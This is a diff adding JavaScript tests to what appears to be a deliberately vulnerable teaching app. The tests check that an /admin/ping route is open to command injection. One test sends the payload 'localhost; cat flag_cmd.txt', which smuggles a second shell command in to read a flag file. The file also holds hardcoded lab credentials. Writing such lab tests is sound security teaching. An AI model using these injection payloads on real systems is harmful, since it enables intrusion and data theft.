@@ -183,3 +183,36 @@ describe('VULN 5 — File Inclusion / Path Traversal', () => {
     assert.ok(res.body.content.includes('FLAG{f1l3_1nclus10n}'));
   });
 });
+
+describe('VULN 2 — Command Injection en /admin/ping', () => {
+  let cookie;
+  before(async () => {
+    // Cualquier usuario autenticado puede acceder (insufficient access control)
+    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
+    cookie = res.headers['set-cookie'];
+  });
+
+  test('Ping normal a localhost retorna output', async () => {
+    const res = await request(app).get('/admin/ping?host=localhost').set('Cookie', cookie);
+    assert.equal(res.status, 200);
+    assert.ok(res.body.output);
+  });
+
+  test('Payload con ; cat flag_cmd.txt revela FLAG{cmd_1nj3ct10n}', (_, done) => {
+    const payload = encodeURIComponent('localhost; cat flag_cmd.txt');
+    request(app)
+      .get(`/admin/ping?host=${payload}`)
+      .set('Cookie', cookie)
+      .then(res => {
+        assert.equal(res.status, 200);
+        assert.ok(res.body.output.includes('FLAG{cmd_1nj3ct10n}'), `Output fue: ${res.body.output}`);
+        done();
+      })
+      .catch(done);
+  });
+
+  test('/admin/ping sin sesión retorna 401', async () => {
+    const res = await request(app).get('/admin/ping?host=localhost');
+    assert.equal(res.status, 401);
+  });
+});
